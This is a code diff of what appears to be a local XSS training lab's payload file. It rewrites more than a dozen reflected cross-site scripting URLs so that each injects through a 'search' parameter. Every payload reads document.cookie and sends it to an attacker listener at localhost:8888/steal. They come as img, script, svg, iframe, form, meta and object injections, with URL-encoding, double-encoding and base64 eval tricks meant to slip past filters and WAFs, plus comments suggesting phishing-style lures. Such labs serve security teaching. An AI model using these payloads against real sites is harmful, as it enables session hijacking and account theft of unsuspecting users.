@@ -14,7 +14,10 @@ const ATTACKER = "http://localhost:8888";
 // Social engineering: "Check out this cool feature!"
 // URL parameter contains <img> tag with onerror that steals cookie
 
-http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<img src=x onerror="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">
+
+// Alternative with fetch (modern browsers):
+// http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
 
 
 // ============================================================
@@ -23,7 +26,7 @@ http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localho
 // Social engineering: "Click this link to verify your account"
 // Direct <script> injection in URL parameter
 
-http://localhost:5009/protected?name=<script>fetch('http://localhost:8888/steal?cookie='+document.cookie)</script>
+http://localhost:5009/protected?search=<script>new Image().src='http://localhost:8888/steal?cookie='+document.cookie</script>
 
 
 // ============================================================
@@ -32,7 +35,7 @@ http://localhost:5009/protected?name=<script>fetch('http://localhost:8888/steal?
 // More sophisticated - URL encoded to bypass basic filters
 // %3C = <, %3E = >, %27 = ', %2B = +
 
-http://localhost:5009/protected?q=%3Cscript%3Efetch('http://localhost:8888/steal?cookie='%2Bdocument.cookie)%3C/script%3E
+http://localhost:5009/protected?search=%3Cscript%3Efetch('http://localhost:8888/steal?cookie='%2Bdocument.cookie)%3C/script%3E
 
 
 // ============================================================
@@ -41,7 +44,7 @@ http://localhost:5009/protected?q=%3Cscript%3Efetch('http://localhost:8888/steal
 // Using SVG tag with onload event
 // Often bypasses filters that only check for <script>
 
-http://localhost:5009/protected?data=<svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<svg/onload="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">
 
 
 // ============================================================
@@ -50,7 +53,7 @@ http://localhost:5009/protected?data=<svg/onload="fetch('http://localhost:8888/s
 // Using javascript: protocol in href
 // Works if application reflects URL in <a> tag
 
-http://localhost:5009/protected?redirect=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)
+http://localhost:5009/protected?search=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click here</a>
 
 
 // ============================================================
@@ -58,7 +61,7 @@ http://localhost:5009/protected?redirect=javascript:fetch('http://localhost:8888
 // ============================================================
 // Injects body tag with onload event
 
-http://localhost:5009/protected?content=<body onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<body onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
 
 
 // ============================================================
@@ -66,7 +69,7 @@ http://localhost:5009/protected?content=<body onload="fetch('http://localhost:88
 // ============================================================
 // Creates hidden iframe that loads attacker's page
 
-http://localhost:5009/protected?view=<iframe src="http://localhost:8888/steal?cookie="+document.cookie style="display:none"></iframe>
+http://localhost:5009/protected?search=<iframe src="http://localhost:8888/steal?cookie="+document.cookie style="display:none"></iframe>
 
 
 // ============================================================
@@ -75,7 +78,7 @@ http://localhost:5009/protected?view=<iframe src="http://localhost:8888/steal?co
 // Double URL encoding to bypass WAF/filters
 // %253C = %3C = <
 
-http://localhost:5009/protected?input=%253Cscript%253Efetch('http://localhost:8888/steal?cookie='%252Bdocument.cookie)%253C/script%253E
+http://localhost:5009/protected?search=%253Cscript%253Efetch('http://localhost:8888/steal?cookie='%252Bdocument.cookie)%253C/script%253E
 
 
 // ============================================================
@@ -83,7 +86,7 @@ http://localhost:5009/protected?input=%253Cscript%253Efetch('http://localhost:88
 // ============================================================
 // Using various HTML events: onclick, onmouseover, onfocus
 
-http://localhost:5009/protected?comment=<div onmouseover="fetch('http://localhost:8888/steal?cookie='+document.cookie)">Hover me!</div>
+http://localhost:5009/protected?search=<div onmouseover="fetch('http://localhost:8888/steal?cookie='+document.cookie)">Hover me!</div>
 
 
 // ============================================================
@@ -91,7 +94,7 @@ http://localhost:5009/protected?comment=<div onmouseover="fetch('http://localhos
 // ============================================================
 // Obfuscated payload using base64 encoding
 
-http://localhost:5009/protected?code=<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))">
+http://localhost:5009/protected?search=<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))">
 
 // Decoded: fetch('http://localhost:8888/steal?cookie='+document.cookie)
 
@@ -110,7 +113,7 @@ data:text/html,<script>fetch('http://localhost:8888/steal?cookie='+document.cook
 // ============================================================
 // Creates hidden form that auto-submits cookie to attacker
 
-http://localhost:5009/protected?page=<form id=x action=http://localhost:8888/steal><input name=cookie></form><script>x.cookie.value=document.cookie;x.submit()</script>
+http://localhost:5009/protected?search=<form id=x action=http://localhost:8888/steal><input name=cookie></form><script>x.cookie.value=document.cookie;x.submit()</script>
 
 
 // ============================================================
@@ -118,7 +121,7 @@ http://localhost:5009/protected?page=<form id=x action=http://localhost:8888/ste
 // ============================================================
 // Uses meta refresh to execute JavaScript
 
-http://localhost:5009/protected?redirect=<meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
 
 
 // ============================================================
@@ -126,7 +129,7 @@ http://localhost:5009/protected?redirect=<meta http-equiv="refresh" content="0;u
 // ============================================================
 // Using object tag to load external resource
 
-http://localhost:5009/protected?media=<object data="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<object data="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
 
 
 // ============================================================
@@ -135,7 +138,7 @@ http://localhost:5009/protected?media=<object data="javascript:fetch('http://loc
 // Creates clickable link with javascript: protocol
 // Social engineering: "Click here to continue"
 
-http://localhost:5009/protected?next=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click to verify account</a>
+http://localhost:5009/protected?search=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click to verify account</a>
 
 
 // ============================================================
